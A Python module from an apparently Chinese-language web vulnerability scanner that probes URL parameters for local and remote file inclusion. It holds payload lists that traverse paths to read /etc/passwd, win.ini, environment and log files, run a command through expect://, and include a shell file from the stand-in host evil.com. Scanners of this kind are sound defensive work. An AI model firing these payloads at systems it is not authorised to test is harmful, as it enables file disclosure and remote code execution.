"""
LFI/RFI (Local/Remote File Inclusion) Vulnerability Scanner
Detects path traversal and file inclusion vulnerabilities
"""
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.core.http_client import get_client


class LFIDetector(BaseScanner):
    name = "文件包含漏洞"
    description = "检测目标是否存在本地/远程文件包含漏洞，攻击者可读取敏感文件或执行远程代码"
    category = "lfi"
    module = "lfi_detector"
    risk_level = "high"
    risk_score = 80
    cve_ids = []
    references = [
        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
    ]
    fix_suggestion = "避免在文件包含函数中使用用户输入，使用白名单限制可包含的文件路径，禁用allow_url_include等危险配置。"

    LFI_PAYLOADS = [
        "../../../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "../../../../../../../../var/log/apache2/access.log",
    ]

    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "ftp://evil.com/shell.txt",
        "http://127.0.0.1:8080/shell.txt",
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()

    def _inject_payload(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            injected = {}
            for key in params:
                if any(kw in key.lower() for kw in ["file", "page", "path", "include", "template", "view", "load", "read", "doc", "document", "dir", "folder", "module", "layout", "content", "lang", "language"]):
                    injected[key] = [payload]
                else:
                    injected[key] = params[key]
            if any(k for k in injected if injected[k] == [payload]):
                new_query = urllib.parse.urlencode(injected, doseq=True)
                return urllib.parse.urlunparse(parsed._replace(query=new_query))
        return f"{url}?file={urllib.parse.quote(payload)}"

    def check(self) -> bool:
        found_any = False

        linux_indicators = ["root:", "daemon:", "bin:", "sys:", "nobody:"]
        windows_indicators = ["[fonts]", "[extensions]", "[mci extensions]", "[files]"]

        for payload in self.LFI_PAYLOADS[:12]:
            try:
                injected_url = self._inject_payload(self.target, payload)
                resp = self._client.get(injected_url, timeout=10)
                if resp.status and resp.body:
                    text = resp.body.decode("utf-8", errors="replace")
                    for indicator in linux_indicators:
                        if indicator in text:
                            found_any = True
                            self.add_result(
                                name="本地文件包含漏洞 (LFI)",
                                target_url=self.target,
                                description="检测到LFI漏洞，攻击者可读取服务器任意文件，包括配置文件、密码文件等敏感信息。",
                                detail=f"Payload: {payload}\n成功读取/etc/passwd文件。",
                                payload=payload,
                                evidence=text[:500],
                            )
                            return True
                    for indicator in windows_indicators:
                        if indicator in text:
                            found_any = True
                            self.add_result(
                                name="本地文件包含漏洞 (LFI - Windows)",
                                target_url=self.target,
                                description="检测到LFI漏洞，攻击者可读取Windows系统文件。",
                                detail=f"Payload: {payload}\n成功读取Windows系统文件。",
                                payload=payload,
                                evidence=text[:500],
                            )
                            return True
                    if "PD9waHA" in text or "<?php" in text:
                        found_any = True
                        self.add_result(
                            name="本地文件包含漏洞 (PHP Filter)",
                            target_url=self.target,
                            description="检测到LFI漏洞，可通过php://filter读取PHP源码。",
                            detail=f"Payload: {payload}\n成功读取PHP源码。",
                            payload=payload,
                            evidence=text[:300],
                        )
                        return True
            except Exception:
                continue

        return found_any
